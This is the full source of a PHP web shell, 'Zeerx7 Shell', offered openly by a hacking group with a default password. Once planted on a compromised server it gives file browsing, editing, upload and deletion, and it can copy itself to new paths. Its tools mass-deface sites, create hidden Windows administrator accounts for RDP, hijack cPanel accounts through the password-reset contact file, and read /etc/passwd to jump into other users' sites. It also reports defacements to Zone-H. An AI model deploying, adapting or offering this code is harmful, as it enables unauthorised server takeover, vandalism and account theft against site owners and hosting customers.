<?php
/*
    ^ Name : Zeerx7 Shell
    ^ Author: Zeerx7(Pausi)
    ^ Team: XploitSec-ID
    ^ Version : V.1
    ^ https://github.com/404rgr/zeerx7

    * Ingin Record? izin dulu gan
    * gak izin? Sfx lo nob bab!

    ! Note:
    'tidak semua tools disini saya yang buat!!'
    'untuk tools akan ditambah di versi selanjutnya'

    /^
        Pass Default : z7
    ^/

*/
session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$MyPass = 'z7'; // Password Default: z7
function dup($pass,$n){
if($_GET['pass'] == $pass){
$f =  __FILE__;
$d =  __DIR__;
echo $d.'/'.$n;
$pausi = fread(fopen($f,'r'),filesize($f));
if(fwrite(fopen($d.'/'.$n,'w'),$pausi)){
   echo ' [Success]';
}else{
   echo ' [failed]';
}
}else{
   echo 'Error [PASSWORD]';
}
exit;
}
if($_GET['dup'] == 'true' and !empty($_GET['filename'])){
   dup($MyPass,$_GET['filename']);
}
if (empty($_SESSION['login'])) {
    pausi_login();
}
if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['action'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
echo "
<!DOCTYPE html>
<html>
<head>
    <title>{ Zeerx7 Shell }</title>
    <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' />
    <style type='text/css'>
        body{
            font-family: 'Source Sans Pro';
            background: black;
            margin 0;
            color: white;
        }.pausi{
            margin: 0 auto;
            width: 100%;
        }
        table {
            margin: auto;
            font-family: \"Lucida Sans Unicode\", \"Lucida Grande\", \"Segoe Ui\";
            font-size: 15px;
            width: 100%;
        }th{
            background-color: #302F2F;
        }td{border-bottom: 1px dashed #00008B;
            background-color: black;
            padding: 90 11px;
        }.t{
            text-align: center;
        }tr:hover td{
            background-color: red;
        }.center{
            text-align: center;
        }.box{
    min-width:50%;
    border-radius:8px;
    opacity:1;
    padding: 10px;
    box-shadow:1px 1px 25px red;
    opacity:0.98;
}.menu{
    border:1px solid red;
    background-color:black;
    text-align: center;
    width:80px;
    padding: 5px;
    color:white;
}a{
    font-family: 'arial';
    color: white;
    text-decoration: none;
    margin: 0;
}a:hover{
 color: gold;
}.u{float:right;text-align:right;margin-bottom:1.5em}input[type=file]{display:none}input[type=submit]{border:1px solid #181818;padding:.2em;}      
    </style>
</head>
<body>";
if (empty($_GET['dir'])) {
    $dir = getcwd();
} else {
    $dir = $_GET['dir'];
    chdir($dir);
}
function pausipath()
{
    global $dir;
    $path  = str_replace('\\', '/', $dir);
    $paths = explode('/', $path);
    
    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) {
            $a = true;
            echo '<a href="?dir=/">/</a>';
            continue;
        }
        if ($pat == '')
            continue;
        echo '<a href="?dir=';
        for ($i = 0; $i <= $id; $i++) {
            echo "$paths[$i]";
            if ($i != $id)
                echo "/";
        }
        echo '">' . $pat . '</a>/';
    }
}
function ip_info()
{
    $ip2 = getHostByName(getHostName());
    $p   = "Server IP: " . $ip2 . " | Your IP: " . $_SERVER['REMOTE_ADDR'];
    return $p;
}
$verPHP    = phpversion();
$IP        = getHostByName(getHostName());
$localhost = shell_exec(hostname);
$soft      = $_SERVER['SERVER_SOFTWARE'];
$mysql     = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$curl      = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$mail      = (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
echo "<center><font size='6px' color='lavender'>^_^ Zeerx7 Shell *_*</font><br></center>
    <div class='pausi'>
        <p>" . php_uname() . "<br>" . ip_info() . "<br>
        $soft <br>
        MySQL: $mysql | cURL: $curl | MAILER: $mail<br>";
pausipath();
echo ' [ ';
if (is_writable($dir))
    echo '<font color="#00ff00">';
elseif (!is_readable($dir))
    echo '<font color="red">';
echo perms($dir) . '</font> ]';
echo "
    </p><br>
        <center><form method='post' enctype='multipart/form-data' action='?upload=true&dir=$dir'>
        <a class='menu' href='?'>Home</a>
        <label class='menu'>
            <input  type='file' name='pausi_upload[]' onchange='this.form.submit()' multiple> &nbsp;UPLOAD
        </label>
        <a class='menu' href='?tools=jumping'>Jumping</a>
        <a class='menu' href='?tools=mass_deface&dir=$dir'>Mass Deface</a>
        <a class='menu' href='?tools=crack_cpanel'>Crack Cpanel</a>
        <a class='menu' href='?tools=RDP'>Create RDP</a>
        <a class='menu' href='?tools=zone-h'>Zone-H</a>
        <a class='menu' href='?logout=true'>EXIT</a>
        </form>
        </center>
        <br>";
if ($_GET['logout'] == 'true') {
    session_start();
    session_destroy();
    header('location: ?');
    echo " <meta http-equiv=\"refresh\" content=\"0; url=?\"> ";
} elseif ($_GET['action']) {
    if ($_GET['action'] == 'rename') {
        echo "<hr>";
        $re = $_GET['rename'];
        echo "
        <form action='?action=rename&rename=$re&dir=$dir' method=POST>
        New Name : <input type='text' name='fname'>
        <input type='submit' name='fok' value='Done'>
        </form>";
        if (isset($_POST['fok'])) {
            $new = $_POST['fname'];
            if (rename($re, "$dir/$new")) {
                echo "<center>Rename Successfully<center>";
            } else {
                echo "<center>Rename Failed<center><center>";
            }
        }
    } elseif ($_GET['action'] == 'edit') {
        $save = $_GET['edit'];
        echo "<hr>edit=> $save<br><hr>";
        if (!empty($_POST['pausiganteng'])) {
            $up  = fopen($save, "w");
            $res = fwrite($up, $_POST['pausi_ganteng']);
            if ($res) {
                echo "<h3 class=center style='color:green'>Edit Successfully</h3>";
            } else {
                echo "<h4 class=center style='color:red'>Failed!!</h4>";
            }
        }
        $cont = htmlspecialchars(file_get_contents($save));
        echo "<form action='?action=edit&edit=$save&$dir=$dir' method='POST'>
        <center><textarea name='pausi_ganteng' cols=100% rows=30%>$cont</textarea><br><br>
        <input type='submit' name='pausiganteng' value='<<<<<<<<[! Save File !]>>>>>>>>'></center>
        </form><br><br>";
    } elseif ($_GET['action'] == 'view') {
        echo "<hr>";
        echo "View Files=> " . $_GET['view'] . "<br>";
        $cont = htmlspecialchars(file_get_contents($_GET['view']));
        echo "<pre style='background-color: grey'>$cont</pre>";
    } elseif ($_GET['action'] == 'delete-file') {
        if (unlink($_GET['delete'])) {
            $del_pausi = "<h3 class=center style=color:#00ff00>Delete Successfully</h3>";
        } else {
            $del_pausi = "<h3 class=center style=color:red>Delete Failed</h3>";
            
        }
        pausi_tampilkan();
    } elseif ($_GET['action'] == 'delete-dir') {
        $del = delTree($_GET['delete-dir']);
        if ($del) {
            $del_pausi = "<h3 class=center style=color:#00ff00>Delete Successfully</h3>";
        } else {
            $del_pausi = "<h3 class=center style=color:red>Delete Failed</h3>";
            
        }
        pausi_tampilkan();
    } elseif ($_GET['action'] == 'create_file') {
        echo ('<hr>');
        if ($_POST['new_file'] and $_POST['pausi_create_file']) {
            $n   = $_POST['new_file'];
            $isi = $_POST['pausi_create_file'];
            $b   = @fopen($n, "w");
            $sep = @fwrite($b, $isi);
            if ($sep) {
                echo "<h3 class=center style=color:#00ff00>Create $n Successfully</h3>";
            } else {
                echo "<h3 class=center style=color:red>Create $n Failed</h3>";
            }
            echo "<br>";
        }
        echo "<form method=POST>
            <h3>New File: <input type=text name=new_file placeholder=\"Nama File\"><br>
            <h3>Isi File: </h3><textarea name=pausi_create_file cols=100% rows=30% placeholder=\"Isi File\"></textarea></h3><br>
            <button type=submit>Create</button>
        </form>";
    } elseif ($_GET['action'] == 'new-dir') {
        echo ('<hr>');
        if ($_POST['new_dr']) {
            $sep = @mkdir($_POST['new_dr']);
            if ($sep) {
                echo "<h3 class=center style=color:#00ff00>Create $n Successfully</h3>";
            } else {
                echo "<h3 class=center style=color:red>Create $n Failed</h3>";
            }
            echo "<br>";
        }
        echo "<form method=POST>
            <h3>New Folder: <input type=text name=new_dr placeholder=\"Nama Folder\">
            <button type=submit>Create</button>
        </form>";
    }
} elseif ($_GET['tools']) {
    if ($_GET['tools'] == 'jumping') {
        echo "<hr>";
        aksiJump($dir, $IP);
    } elseif ($_GET['tools'] == 'mass_deface') {
        if ($_POST['start']) {
            if ($_POST['tipe'] == 'massal') {
                echo "<div style='margin: 5px auto; padding: 5px'>";
                mass_deface($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                echo "</div>";
            } elseif ($_POST['tipe'] == 'biasa') {
                echo "<div style='margin: 5px auto; padding: 5px'>";
                mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                echo "</div>";
            }
            echo "<a href='?'><- back to home</a>";
        } else {
            echo "<hr>
            <form method='post'>
            <font style='text-decoration: underline;'>Tipe:</font>
            <input type='radio' name='tipe' value='biasa' checked>Biasa<input type='radio' name='tipe' value='massal'>Massal<br><br>
            <font style='text-decoration: underline;'>Dir:</font><br>
            <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br><br>
            <font style='text-decoration: underline;'>Filename:</font><br>
            <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
            <font style='text-decoration: underline;'>Index File:</font><br>
            <textarea name='script' style='width: 450px; height: 200px;'>0wNeD By Zeerx7</textarea><br>
            <input type='submit' name='start' value='Goo!' style='width: 454px;' class='btn btn-success btn-sm'><br><br>
            </form>";
        }
    } elseif ($_GET['tools'] == 'crack_cpanel') {
        crack_cpanel();
    } elseif ($_GET['tools'] == 'zone-h') {
        echo "<hr>";
        if ($_POST['submit']) {
            $domain = explode("\r\n", $_POST['url']);
            $nick   = $_POST['nick'];
            echo "<font color='white'>Defacer Onhold:</font> <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
            echo "<font color='white'>Defacer Archive:</font> <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
            function zoneh($url, $nick)
            {
                $ch = curl_init("http://www.zone-h.com/notify/single");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
                return curl_exec($ch);
                curl_close($ch);
            }
            foreach ($domain as $url) {
                $zoneh = zoneh($url, $nick);
                if (preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                    echo "<font color='white'>$url -> </font><font color=green>OK</font><br>";
                } else {
                    echo "<font color='white'>$url -> </font><font color=red>ERROR</font><br>";
                }
            }
        } else {
            echo "<center>
        <font size='7' color='red' face='Orbitron'>Zone-H Mass Notify</font><br>";
            echo "<br>
            <form method='post'>
            <input style='width: 350px;' type='text' name='nick' placeholder='Defacer' value=Zeerx7><br><br>
            <textarea style='width: 350px;' placeholder='http://zone-xsec.com/' name='url'></textarea><br><br><input class='tombol' type='submit' name='submit' value='Submit'>
            </form>";
        }
    } elseif ($_GET['tools'] == 'RDP') {
        echo "<hr>
<div style='padding: 2em;'>
<form method=POST>
<label>CREATE RDP </label><br>
<label>Username: </label>
<input type=text style='border:1px solid #590;' name=user>
<label> &nbsp;&nbsp;&nbsp;&nbsp;Password: </label>
<input type=text style='border:1px solid #590;' name=pass>
<input type='SUBMIT' name=create_rdp VALUE='CREATE'>
</form>
<br><br><br>

<form method=POST>
<label>OPTION </label><br>
<label>Username: </label>
<input type=text style='border:1px solid #590;' name=user>
<label> &nbsp;&nbsp;&nbsp;&nbsp;Password: </label>
<input type=text style='border:1px solid #590;' name=pass>
<label>&nbsp;&nbsp;&nbsp;&nbsp;Action: </label>
<select name='action'>
                                                        <option value='1'>Tampilkan Username</option>
                                                        <option value='2'>Hapus Username</option>
                                                        <option value='3'>Ubah Password</option>
                                                </select>
<input type='SUBMIT' value='GO!' name='option'>
</form>
</div>
        ";
        
        $inf = "<p>--------------{ INFORMATION }--------------</p>";
        if ($_POST['create_rdp']) {
            print $inf;
            $user = $_POST['user'];
            $pass = $_POST['pass'];
            $cek  = shell_exec("net user");
            if (preg_match("/$user/", $cek)) {
                echo $localhost . $user . " sudah ada<br>";
            } else {
                $cmd_add_user    = shell_exec("net user " . $user . " " . $pass . " /add");
                $cmd_add_groups1 = shell_exec("net localgroup Administrators " . $user . " /add");
                $cmd_add_groups2 = shell_exec("net localgroup Administrator " . $user . " /add");
                $cmd_add_groups3 = shell_exec("net localgroup Administrateur " . $user . " /add");
                
                if ($cmd_add_user) {
                    echo "# [add user]-> " . $user . " <font color='greenyellow'>Berhasil</font><br>";
                } else {
                    echo "# [add user]-> " . $user . " <font color='red'>Gagal</font><br>";
                }
                if ($cmd_add_groups1) {
                    echo "# [add localgroup Administrators]-> " . $user . " <font color='greenyellow'>Berhasil</font><br>";
                } else if ($cmd_add_groups2) {
                    echo "# [add localgroup Administrator]-> " . $user . " <font color='greenyellow'>Berhasil</font><br>";
                } else if ($cmd_add_groups3) {
                    echo "# [add localgroup Administrateur]-> " . $user . " <font color='greenyellow'>Berhasil</font><br>";
                } else {
                    echo "# [add localgroup]-> " . $user . " <font color='red'>Gagal</font><br>";
                }
                echo "# [INFO PC]-> RDP IP " . $_SERVER["HTTP_HOST"] . " Username : " . $user . " Password : " . $pass . " <font color='greenyellow'>Berhasil</font><br>";
                
            }
        } elseif ($_POST['option']) {
            print $inf;
            if ($_POST['action'] == "1") {
                echo "<pre>" . shell_exec("net user") . "</pre>";
            } else if ($_POST['action'] == "2") {
                $username     = $_POST['user'];
                $cmd_cek_user = shell_exec("net user");
                if (!empty($username)) {
                    if (preg_match("/$username/", $cmd_cek_user)) {
                        $cmd_add_user = shell_exec("net user " . $username . " /DELETE");
                        if ($cmd_add_user) {
                            echo "# [remove user]-> " . $username . " <font color='greenyellow'>Berhasil</font><br>";
                        } else {
                            echo "# [remove user]-> " . $username . " <font color='red'>gagal</font><br>";
                        }
                    } else {
                        echo "# [remove user]-> " . $username . " <font color='red'>Tidak ditemukan</font><br>";
                    }
                } else {
                    echo "# [PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font><br>";
                }
            } else if ($_POST['action'] == "3") {
                $username     = $_POST['user'];
                $password     = $_POST['pass'];
                $cmd_cek_user = shell_exec("net user");
                if (!empty($username)) {
                    if (preg_match("/$username/", $cmd_cek_user)) {
                        $cmd_add_user = shell_exec("net user " . $username . " shor7cut");
                        if ($cmd_add_user) {
                            echo "# [change password]-> (" . $username . "|" . $password . ") <font color='greenyellow'>Berhasil</font><br>";
                        } else {
                            echo "# [change password]-> (" . $username . "|" . $password . ") <font color='red'>GAGAL</font><br>";
                        }
                    } else {
                        echo "# [PESAN]-> <font color='red'>Username Tidak Ditemukan di server</font><br>";
                    }
                } else {
                    echo "# [PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font><br>";
                }
            }
        }
    }
} elseif ($_GET['upload'] == 'true') {
    if (isset($_FILES['pausi_upload'])) {
        foreach ($_FILES['pausi_upload']['name'] as $key => $val) {
            $name = $_FILES['pausi_upload']['name'][$key];
            $tmp  = $_FILES['pausi_upload']['tmp_name'][$key];
            if (trim($name) != '') {
                if (move_uploaded_file($tmp, $name)) {
                    $del_pausi = '<h3 class=center style=color:#00ff00>Uploaded ' . $name . ' Successfully</h3><br/>';
                } else {
                    $del_pausi = "<h3 class=center style=color:red>Failed to Upload " . $name . "</h3><br>";
                }
            }
        }
    }
    pausi_tampilkan();
} else {
    pausi_tampilkan();
}
echo "
    </div>
</body>
</html>";
function mass_deface($dir, $namafile, $isi_script)
{
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc   = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                file_put_contents($lokasi, $isi_script);
            } elseif ($dirb === '..') {
                file_put_contents($lokasi, $isi_script);
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo "[<font color=#00ff00>DONE</font>] $lokasi<br>";
                        file_put_contents($lokasi, $isi_script);
                        $idx = mass_deface($dirc, $namafile, $isi_script);
                    }
                }
            }
        }
    }
}
function mass_biasa($dir, $namafile, $isi_script)
{
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc   = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                file_put_contents($lokasi, $isi_script);
            } elseif ($dirb === '..') {
                file_put_contents($lokasi, $isi_script);
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo "[<font color=#00ff00>DONE</font>] $dirb/$namafile<br>";
                        file_put_contents($lokasi, $isi_script);
                    }
                }
            }
        }
    }
}
function delTree($dir)
{
    $files = array_diff(scandir($dir), array(
        '.',
        '..'
    ));
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}
function pausi_tampilkan()
{
    global $dir;
    global $del_pausi;
    echo "<div class=\"box\">
    $del_pausi
    <table>
                    <th style=\"width: 35%\">Name</th>
                    <th>Size</th>
                    <th>Modified</th>
                    <th>Permission</th>
                    <th style=\"width: 30%\">Action</th>
";
    $si = scandir($dir);
    foreach ($si as $fol) {
        $waktu       = date("D-m-Y G:i", filemtime("$dir/$fol"));
        $pausi_perms = perms($dir . "/" . $fol);
        if ($fol == ".") {
            continue;
        } elseif ($fol == "..") {
            print "<tr>
            <td><i class='fa fa-folder-open-o'></i> <a href='?dir=$dir/$fol/'>$fol</a></td>
            <td><center>--</cemter></td>
            <td class=center>" . $waktu . "</td>
            <td class=center>";
            if (is_writable($dir . '/' . $file))
                echo '<font color="#00ff00">';
            elseif (!is_readable($dir . '/' . $file))
                echo '<font color="red">';
            print $pausi_perms . "</td>
            <td class=center><a href='?action=create_file&dir=$dir'>New File</a> | <a href='?action=new-dir&dir=$dir'>New Folder</td>
            <tr>";
        } else {
            if (is_dir("$dir/$fol") == true) {
                print "<tr>
                <td><i class='fa fa-folder-o'></i> <a href='?dir=$dir/$fol/'>$fol</a></td>
                <td class=center>--</td>
                <td class=center>" . $waktu . "</td>
                <td class=center>";
                if (is_writable($dir . '/' . $file))
                    echo '<font color="#00ff00">';
                elseif (!is_readable($dir . '/' . $file))
                    echo '<font color="red">';
                print $pausi_perms . "</td>
                <td><a href='?action=delete-dir&delete-dir=$dir/$fol&dir=$dir'>
                <center>Delete</a> | <a href='?action=rename&rename=$dir/$fol&dir=$dir'>Rename</a></center></td>
                <tr>";
            }
        }
    }
    foreach ($si as $file) {
        $waktu       = date("D-m-Y G:i", filemtime("$dir/$file"));
        $pausi_perms = perms($dir . "/" . $file);
        if ($file == "." || $file == "..") {
            continue;
        } else {
            $size = filesize("$dir/$file") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size = $size . ' KB';
            }
            if (is_file("$dir/$file") == true) {
                print "<tr>
                <td><a href='?action=view&view=$dir/$file&dir=$dir'><i class='fa fa-file-o'></i> $file</a></td>
                <td>$size</td>
                <td class=center>$waktu</td>
                <td class=center>";
                if (is_writable($dir . '/' . $file))
                    echo '<font color="#00ff00">';
                elseif (!is_readable($dir . '/' . $file))
                    echo '<font color="red">';
                echo "$pausi_perms</td>
                <td class=center><a href='?action=edit&edit=$dir/$file&$dir=$dir'>Edit</a> | <a href='?action=delete-file&delete=$dir/$file&dir=$dir'>Delete</a> | <a href='?action=rename&rename=$dir/$file&dir=$dir'>Rename</a> | <a href='?action=download&file=$dir/$file'>Download</a></td>
                </tr>";
            }
        }
    }
    echo "</div>";
}
function pausi_login()
{
    global $MyPass;
    echo "  <title>{ Zeerx7 Shell }</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <style type='text/css'>
  body {
    background: black;
    color: #00FF00;
  }
    input{
    border:0;
    border:1px solid #900;
    background:black;
    color: gold;
  }
  </style><center><br><br>
  <pre>
   / \       _-'
  /|  \-''- _ /
 { |          \
/             \
/       \"o.  |o }
|            \ ;
\             ',
 --\_         __\
     ''-_    \.//
        '-____'
  </pre>
  <form method='POST'>
    <input type='password' name='pw'>
  </form>
";
    session_start();
    if ($_POST['pw'] == $MyPass) {
        $_SESSION['login'] = $MyPass;
        print "<script>window.location='?';</script>";
    }
    exit;
}
function perms($pausi_gan77)
{
    $perms = fileperms($pausi_gan77);
    if (($perms & 0xC000) == 0xC000) {
        $f = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $f = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $f = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $f = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $f = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $f = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $f = 'p';
    } else {
        $f = 'u';
    }
    $f .= (($perms & 0x0100) ? 'r' : '-');
    $f .= (($perms & 0x0080) ? 'w' : '-');
    $f .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $f .= (($perms & 0x0020) ? 'r' : '-');
    $f .= (($perms & 0x0010) ? 'w' : '-');
    $f .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $f .= (($perms & 0x0004) ? 'r' : '-');
    $f .= (($perms & 0x0002) ? 'w' : '-');
    $f .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $f;
}
function crack_cpanel()
{
    echo "<hr><br>";
    echo '<style>.draw {
  height:45px; 
}
.wis{
  height: 25px;
}.logo{ height:70px;}
input[type="email"] { border-radius:5px; border-bottom-color: blue; border-top-color: blue; padding: 10; }
</style>  <center>  <div style=" border: 7px double; border-color: #F90000;border-radius: 16px 16px 16px 16px;-moz-border-radius: 16px 16px 16px 16px;-webkit-border-radius: 16px 16px 16px 16px;height:auto;width:500px; background-color:black;  color:white;"><br><h2>Crack Cpanel   <br><br>  <form action="#" method="post">  <input type="email" name="email" placeholder="Your Email" style="background-color: " />  <input type="submit" name="submit" value="Crack" style="background-color: transparent;font: 15pt cursive;color:#80D713;"/>  </form>         <br /><br />   </p>    ';
    $IIIIIIIIIIII = get_current_user();
    $IIIIIIIIIII1 = $_SERVER['HTTP_HOST'];
    $IIIIIIIIIIlI = getenv('REMOTE_ADDR');
    if (isset($_POST['submit'])) {
        $email        = $_POST['email'];
        $IIIIIIIIIIl1 = 'email:' . $email;
        $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w');
        fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
        fclose($IIIIIIIIII1I);
        $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w');
        fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
        fclose($IIIIIIIIII1I);
        $IIIIIIIIIlIl    = "https://";
        $IIIIIIIIIlI1    = "2083";
        $IIIIIIIIIllI    = $IIIIIIIIIII1 . ':2083/resetpass?start=1';
        $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo');
        if (!$read_named_conf) {
            echo "<h1>maaf dak pacak di akses ster</h1><br><br> </pre></center>";
        } else {
            echo "<center>SALIN INI STER TRUZZ GASS <BR><BR></center>";
            echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">SALIN TEXT</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> ';
            echo '<br/><center><a  target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '"><img class="wis"src="https://i.ibb.co/hgKSY0K/cooltext317065123408510.png"></a><br><br></center>';
            ;
        }
    }
}

function aksiJump($dir, $ip)
{
    $i = 0;
    echo "<div class='card container'>";
    if (preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if (isset($_POST['jump'])) {
            echo "<pre>";
            foreach ($urls as $url) {
                $url = str_replace(array(
                    "http://",
                    "www."
                ), "", strtolower($url));
                $etc = "/etc/passwd";
                $f   = fopen($etc, "r");
                while ($gets = fgets($f)) {
                    $pecah    = explode(":", $gets);
                    $user     = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if (is_dir($dir_user) === true) {
                        $url_user = $dir_user . "/" . $url;
                        if (is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
                            if (is_writable($url_user)) {
                                $jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
                            }
                            echo $jrw . "<br>";
                        }
                    }
                }
            }
            if (!$i == 0) {
                echo "<br>Total ada $i KAMAR di $ip";
            }
            echo "</pre>";
        } else {
            echo '<center><form method="post">
                List Domains: <br>
                <textarea name="url" class="form-control">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt", "r");
            while ($getss = fgets($fp)) {
                echo $getss;
            }
            echo '</textarea><br>
                      <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
            </form></center>';
        }
    } elseif (preg_match("/vhosts/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if (isset($_POST['jump'])) {
            echo "<pre>";
            foreach ($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if (is_dir($web_vh) === true) {
                    if (is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
                        if (is_writable($web_vh)) {
                            $jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
                        }
                        echo $jrw . "<br>";
                    }
                }
            }
            if (!$i == 0) {
                echo "<br>Total ada $i Kamar Di $ip";
            }
            echo "</pre>";
        } else {
            echo '<center><form method="post">
                List Domains: <br>
                <textarea name="url" class="form-control">';
            bing("ip:$ip");
            echo '</textarea><br>
                <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
            </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font><br/>");
        while ($passwd = fgets($etc)) {
            if ($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font><br/>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach ($user_jumping[1] as $user_pro_jump) {
                    $user_jumping_dir = "/home/$user_pro_jump/public_html";
                    if (is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
                        if (is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if (function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");
                            if ($domain_jump == '') {
                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach ($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if ($user_jumping_url == $user_pro_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if (!$i == 0) {
            echo "<br>Total ada $i kamar di $ip";
        }
        echo "</pre>";
    }
    echo "</div><br/>";
    exit;
}
?>
